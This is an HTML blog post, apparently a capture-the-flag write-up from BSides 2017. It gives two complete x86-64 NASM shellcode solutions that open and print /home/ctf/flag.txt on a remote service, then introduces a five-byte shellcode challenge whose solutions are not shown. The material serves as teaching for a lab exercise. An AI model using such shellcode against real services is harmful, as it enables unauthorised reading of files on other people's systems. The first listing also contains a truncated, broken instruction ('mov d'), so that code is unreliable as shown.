_posts/2017-02-14-bsides-ctf-writeup.html


<div id="outline-container-orge1e7ad8" class="outline-3">
<h3 id="orge1e7ad8"><span class="todo TODO">TODO</span> Skipper2</h3>
</div>

<div id="outline-container-org760ea03" class="outline-3">
<h3 id="org760ea03">Easyshell 1</h3>
<div class="outline-text-3" id="text-org760ea03">
<p>
Both of the easyshell puzzles are warmups who run any shellcode sent on the
wire. However, you can&rsquo;t use some of the most common shellcode for spawning
<code>/bin/sh</code> as there is no remote shell. This shellcode reads the file
<code>/home/ctf/flag.txt</code>
</p>

<p>
Compile with <code>nasm -f bin flag.asm</code>
</p>

<div class="org-src-container">
<pre class="src src-nasm"><span style="color: #859900; font-weight: bold;">BITS</span> <span style="color: #6c71c4;">64</span>
<span style="color: #859900; font-weight: bold;">section</span> <span style="color: #b58900;">.text</span>

<span style="color: #268bd2;">_start</span>:
  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">eax</span>,<span style="color: #268bd2;">eax</span>
  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">ebx</span>
  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ecx</span>,<span style="color: #268bd2;">ecx</span>
  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">edx</span>,<span style="color: #268bd2;">edx</span>
  <span style="color: #657b83; font-weight: bold;">jmp</span>    read

<span style="color: #268bd2;">one</span>:
  <span style="color: #657b83; font-weight: bold;">pop</span>    <span style="color: #268bd2;">rbx</span>
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x5</span>
  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ecx</span>,<span style="color: #268bd2;">ecx</span>
  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">esi</span>,<span style="color: #268bd2;">eax</span>
  <span style="color: #657b83; font-weight: bold;">jmp</span>    read

<span style="color: #268bd2;">exit</span>:
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x1</span>
  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">ebx</span>
  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>

<span style="color: #268bd2;">read</span>:
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">esi</span>
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x3</span>
  <span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x1</span>
  <span style="color: #657b83; font-weight: bold;">lea</span>    <span style="color: #268bd2;">ecx</span>,<span style="color: #2aa198;">[</span><span style="color: #268bd2;">rsp</span><span style="color: #2aa198;">]</span>
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">dl</span>,<span style="color: #6c71c4;">0x1</span>
  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>
  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">ebx</span>
  <span style="color: #657b83; font-weight: bold;">cmp</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">eax</span>
  <span style="color: #657b83; font-weight: bold;">je</span>     exit
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x4</span>
  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">bl</span>,<span style="color: #6c71c4;">0x1</span>
  <span style="color: #657b83; font-weight: bold;">mov</span>    d
  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>
  <span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x1</span>
  <span style="color: #657b83; font-weight: bold;">jmp</span>    read

<span style="color: #268bd2;">two</span>:
  <span style="color: #657b83; font-weight: bold;">call</span>   one
  <span style="color: #268bd2;">string</span>: <span style="color: #657b83; font-weight: bold;">db</span> <span style="color: #2aa198;">"/home/ctf/flag.txt"</span>
</pre>
</div>
</div>
</div>


<div id="outline-container-org99fdcd3" class="outline-3">
<h3 id="org99fdcd3">Easyshell 2</h3>
<div class="outline-text-3" id="text-org99fdcd3">
<p>
Like the prior challenge, you simply just need to write some code to read out
a file. I used the following.
</p>

<div class="org-src-container">
<pre class="src src-nasm"><span style="color: #859900; font-weight: bold;">BITS</span> <span style="color: #6c71c4;">64</span>
<span style="color: #859900; font-weight: bold;">section</span> <span style="color: #b58900;">.text</span>
<span style="color: #268bd2;">_start</span>:
  <span style="color: #657b83; font-weight: bold;">jmp</span> _<span style="color: #657b83; font-weight: bold;">push</span>_filename

<span style="color: #268bd2;">_readfile</span>:
  <span style="color: #93a1a1;">; syscall open file</span>
  <span style="color: #657b83; font-weight: bold;">pop</span> <span style="color: #268bd2;">rdi</span> <span style="color: #93a1a1;">; pop path value</span>
  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">al</span>, <span style="color: #6c71c4;">2</span>
  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rsi</span>, <span style="color: #268bd2;">rsi</span> <span style="color: #93a1a1;">; set O_RDONLY flag</span>
  <span style="color: #657b83; font-weight: bold;">syscall</span>

  <span style="color: #93a1a1;">; syscall read file</span>
  <span style="color: #657b83; font-weight: bold;">sub</span> <span style="color: #268bd2;">sp</span>, <span style="color: #6c71c4;">0xfff</span>
  <span style="color: #657b83; font-weight: bold;">lea</span> <span style="color: #268bd2;">rsi</span>, <span style="color: #2aa198;">[</span><span style="color: #268bd2;">rsp</span><span style="color: #2aa198;">]</span>
  <span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">rdi</span>, <span style="color: #268bd2;">rax</span>
  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rdx</span>, <span style="color: #268bd2;">rdx</span>
  <span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">dx</span>, <span style="color: #6c71c4;">0xfff</span><span style="color: #93a1a1;">; size to read</span>
  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
  <span style="color: #657b83; font-weight: bold;">syscall</span>

  <span style="color: #93a1a1;">; syscall write to stdout</span>
  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rdi</span>, <span style="color: #268bd2;">rdi</span>
  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">dil</span>, <span style="color: #6c71c4;">1</span> <span style="color: #93a1a1;">; set stdout fd = 1</span>
  <span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">rdx</span>, <span style="color: #268bd2;">rax</span>
  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">al</span>, <span style="color: #6c71c4;">1</span>
  <span style="color: #657b83; font-weight: bold;">syscall</span>

  <span style="color: #93a1a1;">; syscall exit</span>
  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">al</span>, <span style="color: #6c71c4;">60</span>
  <span style="color: #657b83; font-weight: bold;">syscall</span>

_<span style="color: #657b83; font-weight: bold;">push</span>_filename:
  <span style="color: #657b83; font-weight: bold;">call</span> _readfile
  <span style="color: #268bd2;">path</span>: <span style="color: #657b83; font-weight: bold;">db</span> <span style="color: #2aa198;">"/home/ctf/flag.txt"</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-orga15d741" class="outline-3">
<h3 id="orga15d741">i-am-the-shortest</h3>
<div class="outline-text-3" id="text-orga15d741">
<p>
This is a challenge designed to mimic the common constraints exploit authors must deal with.
</p>

<p>
The premise of the challenge is that you get to execute 5 arbitrary bytes - far
shorter than even the shortest shellcode could allow for.
</p>

<p>
There&rsquo;s undoubtedly dozens of ways the problem can be solved, I&rsquo;ve successfully used two:
</p>
</div>
